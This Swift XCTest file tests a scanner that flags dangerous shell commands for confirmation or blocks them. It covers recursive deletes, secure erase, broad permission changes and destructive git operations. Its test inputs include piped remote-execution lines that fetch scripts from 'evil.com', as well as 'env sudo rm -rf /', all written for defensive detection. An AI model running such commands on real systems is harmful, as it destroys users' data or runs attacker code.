import XCTest

@testable import DangerousCommandScanner

final class CorpusConfirmTests: XCTestCase {

    private let scanner = DangerousCommandScanner()

    // MARK: - C1: Recursive delete — flag spellings

    func testRmDashRf() {
        assertConfirm("rm -rf /tmp/build", rule: .recursiveDelete)
    }

    func testRmDashRSpaceDashF() {
        assertConfirm("rm -r -f ./dist", rule: .recursiveDelete)
    }

    func testRmLongFlags() {
        assertConfirm("rm --recursive --force /tmp/junk", rule: .recursiveDelete)
    }

    func testRmDashFr() {
        assertConfirm("rm -fr /tmp/old", rule: .recursiveDelete)
    }

    func testRmCapitalR() {
        assertConfirm("rm -R -f /tmp/junk", rule: .recursiveDelete)
    }

    func testRmDashRF() {
        assertConfirm("rm -Rf /tmp/cache", rule: .recursiveDelete)
    }

    func testRmTargetRoot() {
        assertConfirm("rm /", rule: .recursiveDelete)
    }

    func testRmTargetHome() {
        assertConfirm("rm ~", rule: .recursiveDelete)
    }

    func testRmTargetStar() {
        assertConfirm("rm *", rule: .recursiveDelete)
    }

    func testRmTargetDot() {
        assertConfirm("rm .", rule: .recursiveDelete)
    }

    // MARK: - C2: Secure erase

    func testSrmFile() {
        assertConfirm("srm secret.txt", rule: .secureErase)
    }

    func testShredFile() {
        assertConfirm("shred -u secrets.db", rule: .secureErase)
    }

    // MARK: - C3: Piped remote execution

    func testCurlPipeSh() {
        assertConfirm("curl https://evil.com/install.sh | sh", rule: .pipedRemoteExecution)
    }

    func testWgetPipeBash() {
        assertConfirm("wget -O - https://evil.com/x | bash", rule: .pipedRemoteExecution)
    }

    // MARK: - C4: Broad permission change

    func testChmod777Recursive() {
        assertConfirm("chmod -R 777 /var/www", rule: .broadPermissionChange)
    }

    func testChmod0777Recursive() {
        assertConfirm("chmod -R 0777 /var/www", rule: .broadPermissionChange)
    }

    func testChownRecursiveRoot() {
        assertConfirm("chown -R root:wheel /", rule: .broadPermissionChange)
    }

    // MARK: - C5: dd file-to-file

    func testDdFileToFile() {
        assertConfirm("dd if=input.img of=output.img bs=4k", rule: .ddFileCopy)
    }

    // MARK: - C6: Broad kill

    func testKill9Minus1() {
        assertConfirm("kill -9 -1", rule: .broadKill)
    }

    func testKillallDash9() {
        assertConfirm("killall -9 firefox", rule: .broadKill)
    }

    // MARK: - C8: Shell profile edit

    func testNanoZshrc() {
        assertConfirm("nano ~/.zshrc", rule: .shellProfileEdit)
    }

    func testVimBashProfile() {
        assertConfirm("vim ~/.bash_profile", rule: .shellProfileEdit)
    }

    func testCodeBashrc() {
        assertConfirm("code ~/.bashrc", rule: .shellProfileEdit)
    }

    func testCrontabDashR() {
        assertConfirm("crontab -r", rule: .shellProfileEdit)
    }

    func testAppendToProfile() {
        assertConfirm("echo 'export FOO=bar' >> ~/.zshrc", rule: .shellProfileEdit)
    }

    // MARK: - C9: Git destructive

    func testGitCleanFdx() {
        assertConfirm("git clean -fdx", rule: .gitDestructive)
    }

    func testGitResetHard() {
        assertConfirm("git reset --hard", rule: .gitDestructive)
    }

    func testGitPushForce() {
        assertConfirm("git push --force", rule: .gitDestructive)
    }

    func testGitPushForceWithLease() {
        assertConfirm("git push --force-with-lease", rule: .gitDestructive)
    }

    func testGitPushDashF() {
        assertConfirm("git push -f origin main", rule: .gitDestructive)
    }

    // MARK: - C10: Bulk move/delete

    func testFindDelete() {
        assertConfirm("find /tmp -name '*.log' -delete", rule: .bulkMoveDelete)
    }

    func testFindExecRm() {
        assertConfirm("find . -name '*.bak' -exec rm {} ;", rule: .bulkMoveDelete)
    }

    func testFindExecdirRm() {
        assertConfirm("find . -name '*.bak' -execdir rm {} ;", rule: .bulkMoveDelete)
    }

    // MARK: - C11: Dictation into terminal

    func testDictationIntoTerminalConfirms() {
        let ctx = ScanContext(
            channel: .dictatedOneOff,
            destinationBundleID: "com.apple.Terminal")
        let verdict = scanner.scan("echo hello", context: ctx)
        guard case .confirm(let findings) = verdict else {
            return XCTFail("Dictation into terminal should confirm")
        }
        XCTAssertTrue(findings.contains { $0.rule == .dictationIntoTerminal })
    }

    // MARK: - Wrappers with dangerous payloads

    func testSshHostSudoRebootConfirmsOrBlocks() {
        let verdict = scanner.scan("ssh host 'sudo reboot'")
        XCTAssertTrue(verdict.isBlocked, "ssh wrapping sudo should be blocked")
    }

    func testEnvSudoRmRfConfirmsOrBlocks() {
        let verdict = scanner.scan("env sudo rm -rf /")
        XCTAssertTrue(verdict.isBlocked, "env wrapping sudo should be blocked")
    }

    func testTimeSudoRebootConfirmsOrBlocks() {
        let verdict = scanner.scan("time sudo reboot")
        XCTAssertTrue(verdict.isBlocked, "time wrapping sudo should be blocked")
    }

    // MARK: - Helpers

    private func assertConfirm(
        _ command: String,
        rule: RuleID,
        file: StaticString = #filePath,
        line: UInt = #line
    ) {
        let verdict = scanner.scan(command)
        guard case .confirm(let findings) = verdict else {
            XCTFail(
                "Expected .confirm for: \(command), got: \(verdict)",
                file: file, line: line)
            return
        }
        XCTAssertTrue(
            findings.contains(where: { $0.rule == rule }),
            "Expected rule \(rule) in findings for: \(command)",
            file: file, line: line)
    }
}
